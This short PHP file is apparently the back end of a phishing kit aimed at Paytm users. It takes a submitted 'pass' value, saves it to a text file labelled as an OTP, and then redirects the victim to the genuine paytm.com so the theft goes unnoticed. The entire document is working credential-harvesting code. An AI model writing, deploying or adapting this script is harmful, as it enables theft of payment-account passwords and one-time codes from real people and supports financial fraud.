<?php
file_put_contents("usernames.txt", "Otp=" .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://paytm.com/');
?>
